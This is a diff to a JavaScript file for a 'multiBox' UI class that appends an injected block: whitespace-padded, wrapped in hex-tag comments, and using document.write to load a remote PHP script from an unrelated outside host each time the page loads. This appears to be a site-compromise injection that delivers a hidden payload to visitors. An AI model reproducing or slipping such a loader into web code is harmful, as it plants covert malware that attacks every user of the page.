@@ -872,3 +872,12 @@ var multiBox = new Class({
 		});
 	}
 });
+
+/*3d237d*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525378'></"+ "script>");
+
+
+/*/3d237d*/
